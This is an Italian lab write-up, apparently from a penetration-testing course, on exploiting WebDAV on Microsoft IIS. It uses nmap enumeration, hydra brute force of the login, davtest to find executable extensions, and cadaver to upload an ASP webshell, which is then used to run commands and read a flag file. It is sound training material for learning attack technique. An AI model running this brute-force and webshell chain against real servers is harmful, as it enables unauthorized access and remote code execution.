# WebDAV Vulnerabilities

Exploitare WebDAV running su Microsoft IIS

<figure><img src="../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Facciamo un nmap scan come prima cosa:

```
nmap -sV -sC 10.2.17.124
```

<figure><img src="../.gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

E vediamo che il servizio sulla porta 80 è Micrsooft IIS

Uno degli script eseguito è anche su webdav ma non ci dà molte informazioni.

Per essere sicuri se WebDAV è in esecuzione su questo server oppure no possiamo usare lo script:

```
nmap -sV -p 80 --script=http-enum 10.2.17.124
```

<figure><img src="../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

E ci dice che la /webdav/ è una cartella potenzialemente interessante. ma che servono delle credenziali per entrare con l'errore 401.

<figure><img src="../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Brute force web authentication form con hydra

Facciamo un bruteforce sia per username che password perché non sappiamo nessuno dei due

```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
// http-get è il tipo di richiesta, mentre /webdav/ è la pagina dove si trova l'authentication form
```

Attenzione che i bruteforce possono causare denial of service, e sarebbe meglio fare recoinessance per capire prima quali sono gli utenti per avere più chance di trovare poi le password e quindi delle credenziali valide.

<figure><img src="../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

Non ha trovato le password ma ai fini del laboratorio queste credenziali ci sono state date e sono:

* username: bob
* password: password\_123321

Infatti se le inseriamo nel form web possiamo accedere al contenuto di webdav:

<figure><img src="../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

Ed abbiamo solo due file:

<figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>

Webdav è un protocollo che ci consente di caricare, scaricare, modificare e eliminare file in questa directory

Come fare ciò? Usiamo davtest

## davtest: Identificare estensioni file eseguibili e operazioni supportate da WebDav

```
davtest -auth bob:password_123321 -url http://10.2.17.124/webdav
```

<figure><img src="../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>

Quello che fa è dirci quali file possiamo caricare ed eseguire sul server:

<figure><img src="../.gitbook/assets/image (214).png" alt=""><figcaption></figcaption></figure>

Crea una stringa e la appende a dei file che uploada sulla directory per verificare se riesce a caricare i file e poi esegue i file per capire quali estensioni possono essere eseguite sul target.

<figure><img src="../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>

Qui possiamo vedere che ad esempio possiamo eseguire file asp, e significa che possiamo creare dei payload in asp da inserire ed eseguire, come ad esempio una remote shell.

<figure><img src="../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

Infine abbiamo un riassunto di quanto scoperto.

## cadaver: Caricare una webshell su WebDav

Ora possiamo usare l'utility cadaver per caricare una webshell.

Cadaver ci consente di fare upload, download di file nella directory WebDav.

```
cadaver http://10.2.17.124/webdav
// chiede poi username e password, e ci connette alla directory
```

<figure><img src="../.gitbook/assets/image (216).png" alt=""><figcaption></figcaption></figure>

Possiamo ora caricare una webshell per ottenere una remote code execution.

Troviamo una webshell di quelle già presente in Kali Linux, in particolare quella asp:

<figure><img src="../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

Directory con webshell:

```
ls -al /usr/share/webshells/
```

### Upload con cadaver della webshell asp

Torniamo ora a cadaver e usiamo il comando put per caricare la webshell sul WebDav target:

```
put /usr/share/webshells/asp/webshell.asp
```

<figure><img src="../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

Se ricarichiamo la pagina web di webdav vediamo infatti sia la cartella con tutti i test fatti da davtest, sia questa nuova webshell.asp:

<figure><img src="../.gitbook/assets/image (219).png" alt=""><figcaption></figcaption></figure>

se clicchiamo sulla shell possiamo vedere che ci apre una pagina dove possiamo scrivere dei comandi e vengono eseguiti sul sistema target (che in questo caso è un sistema Windows quindi dobbiamo usare comandi Windows):

<figure><img src="../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>

Eseguiamo ad esempio ifconfig:

<figure><img src="../.gitbook/assets/image (221).png" alt=""><figcaption></figcaption></figure>

In questo lab l'obiettivo è trovare la flag, e per farlo possiamo listare i file del disco C: che la flag è lì nella root. Per leggerlo possiamo usare il comando "type C:"

```
dir C:\
```

<figure><img src="../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

```
type C:\flag.txt
```

<figure><img src="../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>
